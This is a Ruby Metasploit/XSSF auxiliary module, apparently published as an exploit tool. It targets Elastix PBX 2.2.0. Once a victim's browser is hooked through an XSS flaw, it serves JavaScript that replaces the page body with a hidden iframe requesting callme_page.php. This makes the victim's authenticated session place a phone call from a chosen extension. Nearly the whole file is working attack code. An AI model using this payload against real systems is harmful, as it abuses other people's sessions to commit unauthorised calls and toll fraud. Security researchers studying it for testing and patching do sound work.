require 'msf/core'
require 'xssf/xssfmaster'

#
# READ README_XSSF FILE FOR MORE INFORMATION ABOUT MODULES
#
class Metasploit3 < Msf::Auxiliary
	include Msf::Xssf::XssfServer
	
	# Module initialization
	def initialize(info = {})
        super(update_info(info,
            'Name'        => 'Elastix PBX VoIP Call',
            'Description' => 'This Module uses the XSS vulnerability in the Web Interface of Elastix PBX server version 2.2.0 to launch a call. The call can be made only by an authenticated SIP client.', 
			'Author' 	  => 'Adwiteeya Agrawal <adwiteeyaagrawal[at]gmail[dot]com>'
        ))
               
        register_options(
        [
            OptAddress.new('address', [true, 'IP adress', 'localhost']),
			OptInt.new('extension', [true, 'Extension', 1000])
        ], self.class
        )
    end
	
	# Part sent to the victim, insert your code here !!!
 	def on_request_uri(cli, req)
		code = %Q{
			document.body.innerHTML = "<iframe src=https://#{datastore['address']}/recordings/misc/callme_page.php?action=c&callmenum=#{datastore['extension']}@from-internal/h></iframe>";
			XSSF_POST("Phone call launched",'#{self.name}');
		}
		
		send_response(cli, code)
	end
end
